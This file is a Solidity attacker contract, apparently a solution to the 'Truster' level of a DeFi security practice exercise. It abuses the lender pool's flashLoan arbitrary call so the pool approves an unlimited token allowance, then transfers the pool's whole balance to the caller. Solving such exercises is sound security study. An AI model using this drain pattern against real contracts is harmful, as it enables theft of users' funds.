// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
contract Attacker{


    function attack(address _pool, address _token) public{

        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        //approve msg.sender to spend 2M tokens from the pool
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), int(-1));
        
        pool.flashLoan(0, msg.sender, _token, data);

        
        //transfer tokens to msg.sender from pool
        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));

    }



}